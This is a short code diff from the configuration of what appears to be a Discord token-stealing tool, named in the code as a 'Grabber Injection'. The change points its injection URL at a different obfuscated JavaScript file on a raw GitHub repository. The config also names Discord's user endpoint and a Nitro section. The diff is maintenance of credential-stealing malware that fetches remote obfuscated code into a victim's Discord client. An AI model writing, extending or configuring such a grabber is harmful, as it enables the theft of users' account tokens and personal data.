@@ -15,7 +15,7 @@ const config = {
   embed_name: 'Imam Zman Grabber Injection', 
   embed_icon: 'https://i1.sndcdn.com/artworks-000054690813-f1pj99-t500x500.jpg',
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/baarad/aedihjgvbnfdkhjbnksdjvbkls/refs/heads/main/realobf.js', 
+  injection_url: 'https://raw.githubusercontent.com/baarad/aedihjgvbnfdkhjbnksdjvbkls/refs/heads/main/reallobf.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
